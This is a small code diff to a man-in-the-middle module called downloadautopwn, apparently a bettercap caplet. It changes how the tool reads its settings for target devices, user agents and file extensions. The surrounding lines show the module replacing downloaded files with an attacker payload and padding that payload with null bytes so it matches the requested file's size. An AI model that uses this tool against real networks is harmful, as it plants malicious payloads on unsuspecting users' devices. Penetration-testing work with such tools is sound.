@@ -9,13 +9,13 @@ var green   = "\033[32m",
     redLine = "\n  " + onRed + " " + reset
 
 function onLoad() {
-	devices = env("downloadautopwn.devices").split(",")
+	devices = env["downloadautopwn.devices"].split(",")
 	logStr = ""
 	for (var i = 0; i < devices.length; i++) {
 		item = {
 			"device": devices[i],
-			"useragent": env("downloadautopwn.useragent." + devices[i]),
-			"extensions": env("downloadautopwn.extensions." + devices[i]).toLowerCase().split(",")
+			"useragent": env[ "downloadautopwn.useragent." + devices[i] ],
+			"extensions": env[ "downloadautopwn.extensions." + devices[i] ].toLowerCase().split(",")
 		}
 		targets[i] = item
 		logStr += "\n  " + green + targets[i]["device"] + reset +
@@ -53,7 +53,7 @@ function onResponse(req, res) {
 						payloadSize = payload.length
 						logStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
 						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
-						if ( env("downloadautopwn.resizepayloads") == "true" ) {
+						if ( env["downloadautopwn.resizepayloads"] == "true" ) {
 							// Check requested file size
 							requestedFile = res.ReadBody()
 							requestedFileSize = requestedFile.length
